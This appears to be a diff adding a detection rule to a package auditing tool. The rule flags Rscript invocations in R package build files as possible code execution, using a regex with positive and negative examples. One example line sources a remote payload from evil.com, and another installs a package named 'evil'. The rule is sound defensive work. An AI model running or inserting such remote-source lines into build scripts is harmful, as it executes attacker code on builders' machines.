@@ -1,0 +1,34 @@
+name: rscript
+version: "0.1.0"
+language: shell
+attck:
+  - T1059
+message: >-
+  Rscript runs R code from a shell script or Make-like file, either from a file
+  it is given or inline with -e. That code executes when the package is built,
+  checked, or installed, and pkgaudit does not parse it: code inside an -e
+  string, or in a script under tools/, is reached only through this invocation.
+  The invocation is reported so a reviewer can follow it.
+regex: '(?<=^|[^[:alnum:]_-])Rscript(?=(\.exe)?([^[:alnum:]_./-]|$))'
+positive_examples:
+  - |
+    Rscript -e 'source("https://www.evil.com/payload.R")'
+  - |
+    Rscript tools/setup.R
+  - |
+    ${R_HOME}/bin/Rscript -e 'install.packages("evil")'
+  - |
+    PKG_LIBS := $(shell $(R_HOME)/bin/Rscript -e "Rcpp:::CxxFlags()")
+  - |
+    /usr/lib/R/bin/Rscript.exe configure.R
+negative_examples:
+  - |
+    # Rscripts are documented at https://www.r-project.org
+  - |
+    myRscript --help
+  - |
+    PKG_CPPFLAGS=-IRscriptdir/include
+  - |
+    # See the Rscript-manual for details
+  - |
+    echo "no interpreter is named here"
